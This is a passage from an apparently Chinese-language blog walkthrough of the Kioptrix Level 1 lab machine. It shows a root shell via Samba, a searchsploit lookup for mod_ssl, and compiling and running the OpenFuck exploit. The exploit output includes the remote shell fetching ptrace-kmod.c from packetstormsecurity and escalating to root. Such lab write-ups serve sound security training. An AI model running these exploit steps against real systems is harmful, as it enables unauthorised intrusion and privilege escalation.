class="number">99</span>(nobody)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br></pre></td></tr></table></figure>
+
+<p>好了到此samba的root已经拿到了, 之前提到过</p>
+<ul>
+<li>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="symbol">:~/Desktop</span><span class="comment"># searchsploit mod_ssl</span></span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                                <span class="params">|  Path</span></span><br><span class="line"><span class="params">                                                                                              |</span> (<span class="regexp">/usr/share</span><span class="regexp">/exploitdb/</span>)</span><br><span class="line">---------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apache mod_ssl <span class="number">2.0</span>.x - Remote Denial of Service                                               <span class="params">| exploits/linux/dos/24590.txt</span></span><br><span class="line"><span class="params">Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                    |</span> exploits/multiple/dos/<span class="number">21575</span>.txt</span><br><span class="line">Apache mod_ssl &lt; <span class="number">2.8</span>.<span class="number">7</span> OpenSSL - <span class="string">'OpenFuck.c'</span> Remote Buffer Overflow                          <span class="params">| exploits/unix/remote/21671.c</span></span><br><span class="line"><span class="params">Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow                        |</span> exploits/unix/remote/<span class="number">764</span>.c</span><br><span class="line">Apache mod_ssl OpenSSL &lt; <span class="number">0</span>.<span class="number">9.6</span>d / &lt; <span class="number">0</span>.<span class="number">9.7</span>-beta2 - <span class="string">'openssl-too-open.c'</span> SSL2 KEY_ARG Overflow  <span class="params">| exploits/unix/remote/40347.txt</span></span><br><span class="line"><span class="params">---------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="params">Shellcodes: No Result</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>搜索了一波, 用764编译各种无解报错, 去官网搜一下</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/Desktop</span><span class="comment"># gcc -o 1 47080.c -lcrypto</span></span><br></pre></td></tr></table></figure>
+
+<p>编译成功了</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ./1 0x6b 192.168.208.136 -c 50</span><br><span class="line"></span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line"><span class="bullet">* </span>OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line"><span class="bullet">* </span>by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line"><span class="bullet">* </span>#hackarena  irc.brasnet.org                                     *</span><br><span class="line"><span class="bullet">* </span>TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line"><span class="bullet">* </span>#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line"><span class="bullet">* </span>#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>**</span><br><span class="line"></span><br><span class="line">Connection... 50 of 50</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo </span><br><span class="line">--05:28:08--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line"><span class="code">           =&gt; `ptrace-kmod.c'</span></span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line"></span><br><span class="line"><span class="code">    0K ...                                                   100% @   4.13 KB/s</span></span><br><span class="line"></span><br><span class="line">05:28:11 (4.13 KB/s) - `ptrace-kmod.c' saved [3921/3921]</span><br><span class="line"></span><br><span class="line">/usr/bin/ld: cannot open output file exploit: Permission denied</span><br><span class="line">collect2: ld returned 1 exit status</span><br><span class="line">gcc: file path prefix `/usr/bin' never used</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>拿到root权限</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/10/16/python-Threading模块/" rel="next" title="python-Threading模块">
+                  <i class="fa fa-chevron-left"></i> python-Threading模块
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kioptrix-Level-1"><span class="nav-text">Kioptrix Level 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-text">信息收集</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/header.jpg"
+      alt="Sh4Nn0n">
+  <p class="site-author-name" itemprop="name">Sh4Nn0n</p>
+  <div class="site-description" itemprop="description">甲方安全小白帽，欢迎交流~</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+        
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fuziyuonly" title="GitHub &rarr; https://github.com/fuziyuonly" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://lingwu111.github.io/" title="https://lingwu111.github.io/" rel="noopener" target="_blank">lingwu</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sh4Nn0n</span>
+</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
